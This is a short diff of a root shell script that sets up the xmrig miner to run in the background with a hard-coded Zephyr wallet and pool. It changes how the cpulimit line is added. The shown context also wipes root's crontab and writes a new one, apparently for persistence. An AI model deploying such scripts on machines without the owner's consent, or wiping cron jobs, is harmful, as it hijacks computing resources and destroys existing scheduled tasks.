@@ -25,9 +25,10 @@ echo "$fastest_server with min_latency is: $latency"
 
 cat >>/root/danielchau.sh <<EOF
 sudo /root/xmrig-6.21.0/xmrig --donate-level 1 --threads=$cores --background -o $fastest_server:5352 -u ZEPHYR3cXqeAwGfVsg9dQkiE9jTCUnJzv3sMbCEgjTDGAKaf8nyurWqX3sQFKoxrXrEW1yYYFF4dtF2wYvTByayxbrDLq3RP86w3z -p $worker -a rx/0 -k
-cpulimit --limit=$limitCPU --pid $(pgrep xmrig) > /dev/null 2>&1 &
 EOF
 chmod +x /root/danielchau.sh
+
+sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielchau.sh
 
 cat /dev/null > /var/spool/cron/crontabs/root
 cat >>/var/spool/cron/crontabs/root<<EOF
